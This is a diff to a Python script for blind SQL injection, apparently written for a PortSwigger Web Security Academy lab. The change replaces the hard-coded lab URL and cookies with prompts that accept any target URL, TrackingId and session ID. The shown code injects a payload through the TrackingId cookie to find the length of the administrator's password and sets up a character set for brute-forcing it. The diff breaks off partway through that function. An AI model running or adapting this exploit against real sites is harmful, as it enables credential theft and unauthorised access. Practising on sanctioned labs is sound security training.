@@ -2,20 +2,16 @@ import requests
 import string
 import time
 
-# Target lab URL (modify for your own use)
-url = 'https://0ab000a603573afae27b55a300f800c5.web-security-academy.net/filter?category=Lifestyle'
+# 👉 Ask user to input target details
+url = input("🔗 Enter target URL (include full path): ").strip()
+base_tracking_id = input("🍪 Enter TrackingId value: ").strip()
+session_id = input("🔐 Enter Session ID: ").strip()
 
-# TrackingId value used for SQL injection
-base_tracking_id = 'ZyQjORsMBGr8qWel'
-
-# Session ID cookie (needed to stay authenticated if required)
-session_id = 'i7PIFsvLMtse7mbwmtvcMXnmnBceOZWy'
-
-# Character set to brute-force password (a-z, 0-9, A-Z)
+# Character set: lowercase, digits, uppercase
 characters = string.ascii_lowercase + string.digits + string.ascii_uppercase
 
 def get_length():
-    print("[*] Finding password length...")
+    print("\n[*] Finding password length...")
     for i in range(1, 51):
         payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))={i}--"
         cookies = {
